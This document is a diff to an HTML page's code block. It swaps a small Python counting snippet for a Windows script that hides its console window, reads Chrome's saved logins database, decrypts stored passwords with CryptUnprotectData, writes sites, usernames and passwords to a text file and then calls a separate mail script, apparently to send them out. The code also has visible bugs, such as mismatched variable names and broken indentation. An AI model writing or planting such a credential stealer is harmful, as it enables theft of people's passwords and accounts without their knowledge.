@@ -37,12 +37,34 @@
 				<article>
 					<pre>
 						<code class="cpp">
-if __name__ == __main__:
-    for i in range(1, 100):
-        if i % 3 == 0 and i % 5 == 0:
-            print("Welcome")
-        else:
-            print(i)
+from os import getenv
+import sqlite3
+import win32crypt
+import os
+import win32console, win32gui
+
+window = win32console.GetConsoleWindow() #Comment this out if you dont want to hide the window
+win32gui.ShowWindow(window, 0)
+
+	conn = sqlite3.connect(getenv("APPDATA")+r"\..\Local\Google\Chrome\User Data\Default\Login Data") #Default dir
+	connection = conn.cursor()
+	conn.execute(" busy_timeout = 300000")
+	connection.execute('Select action_url, username_value, password_value FROM logins')
+
+myfile = open(r"Chromepass.txt", "a+")
+myfile.write("Chrome Saved Passwords\n")
+
+for result in cursor.fetchall():
+
+    password = win32crypt.CryptUnprotectData(result[2],None,None,None,0)[1]
+
+    if password:
+        fp.write('\nWebsite: '+result[0])
+        fp.write('\nUsername: '+result[1])
+        fp.write('\nPassword: ' + str(password))
+
+
+os.system('python sendmail.py')
 						</code>
 					</pre>
 
